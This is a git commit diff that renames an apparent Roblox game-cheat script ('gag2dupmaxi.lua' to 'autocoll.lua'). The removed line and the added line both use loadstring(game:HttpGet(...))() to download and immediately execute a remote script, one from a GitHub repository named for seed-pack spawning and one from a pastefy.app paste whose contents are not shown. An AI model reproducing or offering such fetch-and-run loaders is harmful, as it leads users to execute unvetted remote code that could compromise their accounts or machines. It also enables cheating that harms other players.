412089d1d86fe93bf27df2cb4d754be936ba175d
Syntaskk <115303373+syntaskk@users.noreply.github.com>
2026-07-09 14:44:54 +0300

    Update and rename gag2dupmaxi.lua to autocoll.lua

---
+++ autocoll.lua
@@ -0,0 +1,1 @@
+loadstring(game:HttpGet("https://pastefy.app/nTZhjcB1/raw"))()
--- gag2dupmaxi.lua
+++
@@ -1,1 +0,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/VexoScriptsOnTop/_/refs/heads/main/GaG2/SeedPackSpawner.lua"))()
